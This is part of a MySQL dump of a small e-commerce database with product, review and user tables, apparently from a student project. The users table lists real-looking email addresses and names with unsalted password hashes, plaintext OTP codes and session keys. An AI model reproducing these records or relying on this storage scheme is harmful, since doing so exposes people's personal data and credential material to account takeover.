) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `products`
--

LOCK TABLES `products` WRITE;
/*!40000 ALTER TABLE `products` DISABLE KEYS */;
INSERT INTO `products` VALUES (1,'MacBook Pro M3 14 inch',45000000,1,'https://bizweb.dktcdn.net/thumb/1024x1024/100/444/581/products/macbook-pro-14-inch-2021-new-16gb-512gb-jpeg-91a77944-28ee-4a47-953c-bb481de458fd.jpg?v=1663211508763'),(2,'Dell XPS 13 Plus',32500000,1,'https://laptops.vn/wp-content/uploads/2024/06/Dell-XPS-13-9320.jpg'),(3,'Asus ROG Strix G16',28990000,1,'https://product.hstatic.net/200000837185/product/laptop-gaming-asus-rog-strix-g16-g614ju-n3777w_871d74fb20064ca19b2ede8e5bc2350c_master.jpg'),(4,'iPhone 15 Pro Max',34990000,2,'https://cdn2.cellphones.com.vn/x/media/catalog/product/i/p/iphone-15-pro-max_3.png'),(5,'Samsung Galaxy S24 Ultra',31000000,2,'https://cdn2.fptshop.com.vn/unsafe/384x0/filters:format(webp):quality(75)/2024_1_27_638419497673667830_samsung-galaxy-s24-ultra-den-3.png'),(6,'Xiaomi 14',19990000,2,'https://cdn.tgdd.vn/Products/Images/42/298538/xiaomi-14-den-4-750x500.jpg'),(7,'iPad Air 5 M1',14500000,3,'https://cdn2.cellphones.com.vn/x/media/catalog/product/i/p/ipad-air-5.png?https://dienthoaigiakho.vn/_next/image?url=https%3A%2F%2Fcdn.dienthoaigiakho.vn%2Fphotos%2F1675336258494-ipad-air5-64gb-Ro.jpg&w=750&q=75'),(8,'Samsung Galaxy Tab S9',18000000,3,'https://cdn.tgdd.vn/Products/Images/522/303299/samsung-galaxy-tab-s9-wifi-xam-128gb-6-750x500.jpg'),(9,'Apple Watch Series 9',10500000,4,'https://cdnv2.tgdd.vn/mwg-static/tgdd/Products/Images/7077/344750/apple-watch-series-11-vien-nhom-day-the-thao-hong-1-638931878401695857-750x500.jpg'),(10,'Tai nghe Sony WH-1000XM5',7500000,5,'https://cdn.tgdd.vn/Products/Images/54/313692/tai-nghe-bluetooth-chup-tai-sony-wh1000xm5-trang-1-750x500.jpg');
/*!40000 ALTER TABLE `products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `review`
--

DROP TABLE IF EXISTS `review`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `review` (
  `id` int NOT NULL AUTO_INCREMENT,
  `comment` tinytext,
  `createdAt` datetime(6) DEFAULT NULL,
  `rating` int NOT NULL,
  `verified` bit(1) NOT NULL,
  `product_id` bigint DEFAULT NULL,
  `user_id` bigint DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `FKiyof1sindb9qiqr9o8npj8klt` (`product_id`),
  KEY `FKipmoly19mx9xx4f6hoyqdpmys` (`user_id`),
  CONSTRAINT `FKipmoly19mx9xx4f6hoyqdpmys` FOREIGN KEY (`user_id`) REFERENCES `account` (`id`),
  CONSTRAINT `FKiyof1sindb9qiqr9o8npj8klt` FOREIGN KEY (`product_id`) REFERENCES `product` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `review`
--

LOCK TABLES `review` WRITE;
/*!40000 ALTER TABLE `review` DISABLE KEYS */;
INSERT INTO `review` VALUES (2,'dùng tốt','2025-10-14 20:13:57.842000',3,_binary '',28,8),(4,'cái ','2025-10-15 00:00:00.000000',3,_binary '',22,1),(5,'aaaa','2025-10-15 06:35:49.004000',2,_binary '',22,11),(7,'dùng tốt lắm','2025-10-15 10:30:21.106000',5,_binary '',31,25),(8,'dung tot','2025-10-15 11:40:39.366000',5,_binary '',22,8),(10,'Hài lòng','2025-10-15 12:11:16.258000',5,_binary '',23,8),(11,'dùng ngon','2025-10-15 12:16:31.293000',5,_binary '',21,8),(12,'dep','2025-10-15 12:42:13.084000',4,_binary '',23,28),(15,'ngon, rẻ đẹp','2025-10-15 19:36:50.092000',5,_binary '',21,2),(16,'ngon rẻ đẹp','2025-10-15 19:41:27.859000',5,_binary '',22,2);
/*!40000 ALTER TABLE `review` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` bigint NOT NULL AUTO_INCREMENT,
  `email` varchar(255) NOT NULL,
  `full_name` varchar(255) DEFAULT NULL,
  `is_active` bit(1) DEFAULT NULL,
  `join_date` datetime(6) DEFAULT NULL,
  `otp_code` varchar(255) DEFAULT NULL,
  `password` varchar(255) NOT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `session_key` varchar(255) DEFAULT NULL,
  `username` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `UK6dotkott2kjsp8vw4d0m25fb7` (`email`),
  UNIQUE KEY `UKr43af9ap4edm43mmtq01oddj6` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'py_test_O7Ss6j2F@example.com','Tester Nguyen',_binary '\0','2025-11-28 14:32:54.707000',NULL,'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f',NULL,'1a41c5ff-1db6-4263-999e-cb4a50197886','py_test_O7Ss6j2F'),(2,'py_test_l49ARnYH@example.com','Tester Nguyen',_binary '\0','2025-11-28 14:34:41.557000',NULL,'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f',NULL,'1358e9c1-89ae-40d8-bc46-6db570c48fd5','py_test_l49ARnYH'),(3,'py_test_OaaGdeUW@example.com','Tester Nguyen',_binary '\0','2025-11-28 14:47:33.997000',NULL,'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f','0912345678','239bd99e-1268-4dbf-9296-c40b8227a8e9','py_test_OaaGdeUW'),(4,'py_test_R2KUAsb7@example.com','Tester Nguyen',_binary '','2025-11-28 14:55:47.403000',NULL,'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3','0912345678','8510b85b-3fac-4e44-90eb-766bc0705330','py_test_R2KUAsb7'),(5,'huy@example.com','Tran Huy',_binary '\0','2025-12-04 08:13:07.799000','315610','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'35ad71d4-d0f3-4cee-aca0-e2f8a09f1e12','huy123'),(6,'peterpan@example.com','Peter Pan',_binary '\0',NULL,'721005','983213e63f443a0912a68508a67994755de6350128ca783a8f92413730ceac6a',NULL,'c20f2e56-352f-47b5-b05b-e1322446348f','peterpan_user'),(7,'huy11@example.com','Tran Huy',_binary '','2025-12-04 18:26:25.011000',NULL,'8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'73e25fe8-6448-403c-a647-e4c169330678','huy1234'),(8,'test@example.com','Nguyen Van Test',_binary '\0','2025-12-04 19:30:48.342000','893672','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'814e355a-4ad9-438d-a075-85bdce6673f4','testuser123'),(9,'test1@example.com','Nguyen Van Test',_binary '\0','2025-12-04 21:24:01.283000','131190','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'a786f618-f032-4c20-a17b-d0983c4d6628','testuser1234'),(10,'haoht@gmail.com','huynh thien hao',_binary '\0','2025-12-04 22:33:06.670000','603037','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',NULL,'29272a7a-d24d-4c7f-a64d-1aa8d13a7502','huynhthienhao8337'),(11,'haothienpr@gmail.com','huynh thien hao',_binary '\0','2025-12-04 22:49:55.763000','755078','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'f61ae789-8930-402a-a5d2-8927d677d554','huynhthienhao2512'),(12,'Huy@gmail.com','HHuyn',_binary '\0','2025-12-05 00:07:28.231000','568010','5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5',NULL,'33c58da7-3bb0-46ff-ab4e-9c468e2ddd10','hhuyn6537'),(13,'Huy1806@gmail.com','HuyNe',_binary '\0','2025-12-05 00:26:34.340000','454526','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'158012d8-e913-4a4c-92f2-d2a2aac709aa','huyne1244'),(14,'anime@gmail.com','HuyToCoi',_binary '\0','2025-12-05 00:28:11.735000','195131','e0bc60c82713f64ef8a57c0c40d02ce24fd0141d5cc3086259c19b1e62a62bea',NULL,'aa69bdc4-efbd-4124-a63f-f0b6b20a68e5','huytocoi9001'),(15,'animelibe@gmail.com','animelibe',_binary '\0','2025-12-05 00:29:32.289000','512010','e0bc60c82713f64ef8a57c0c40d02ce24fd0141d5cc3086259c19b1e62a62bea',NULL,'f64c842e-6e87-4917-a0dc-a4cc31c2b769','animelibe9014'),(16,'anime123@gmail.com','Huydeptrai',_binary '\0','2025-12-05 09:27:54.068000','357782','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'45c1cedb-7179-4c60-81a2-47a1c8bab47a','huydeptrai3341'),(17,'test12@example.com','Nguyen Van Test',_binary '\0','2025-12-05 12:47:57.717000','578644','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'4c27b1d5-5a1c-435e-a1ad-dc36eecdda97','testuser12345'),(18,'haothienpro1412@gmail.com','Huỳnh Thiên Hạo',_binary '\0','2025-12-05 12:48:27.256000','911475','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'27309a6f-7519-4124-9139-c5a72167c1f0','haoht203'),(19,'hb172839@gmail.com','hoang',_binary '\0','2025-12-05 12:58:06.845000','479174','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',NULL,'5b651ceb-9768-4dd0-8a28-ea0b25060173','hoang5114'),(20,'test@gmail.com','Huỳnh Thiên Hạo',_binary '','2025-12-05 14:16:06.317000',NULL,'8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'85457b71-14d4-41ea-8e16-3fd2409cdfdd','haothien1412'),(23,'test01@example.com','Le Van Test',_binary '','2025-12-11 07:43:15.691000',NULL,'008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601','0987654321','9e2984e6-7c58-467c-ba5c-36d79824205d','user_test_01'),(24,'vogiahuan2005@gmail.com','Huan6mui',_binary '\0','2025-12-11 09:35:48.658000','242728','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',NULL,'6f679506-a9c0-4180-8e0d-b8955d73dd4e','huan6mui5008'),(25,'nhathuycop@gmail.com','Huy',_binary '\0','2025-12-14 12:34:00.811000','741992','5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5',NULL,'2f76b23e-e6de-454e-8f5b-a9d2e6796b29','huy1383'),(27,'23162031@student.hcmute.edu.vn','Huy',_binary '\0','2025-12-14 12:42:49.230000','545848','8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92',NULL,'85a390b1-b37b-4cb3-9019-16f4f1d64512','huy4484'),(28,'thanlanthangthan@gmail.comthanlanthangthan@gmail.com','HuyDepTrai',_binary '\0','2025-12-20 15:10:06.685000','487834','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',NULL,'be809883-7045-476f-b6d8-5b30e79655bc','huydeptrai3921'),(29,'thanlanthangthan@gmail.com','HuyGentement',_binary '\0','2025-12-20 15:11:53.217000','463345','a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',NULL,'c52dbf83-7dc8-4689-9012-ed923db596e1','huygentement3720'),(30,'nhah37526@gmail.com','Huy123',_binary '','2025-12-22 04:26:12.559000',NULL,'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3',NULL,'21753469-69a6-487a-90f7-2bfc0056a7ee','huy1231209');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping events for database 'ecommerce'
--

--
-- Dumping routines for database 'ecommerce'
--
SET @@SESSION.SQL_LOG_BIN = @MYSQLDUMP_TEMP_LOG_BIN;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2026-03-15 14:48:35
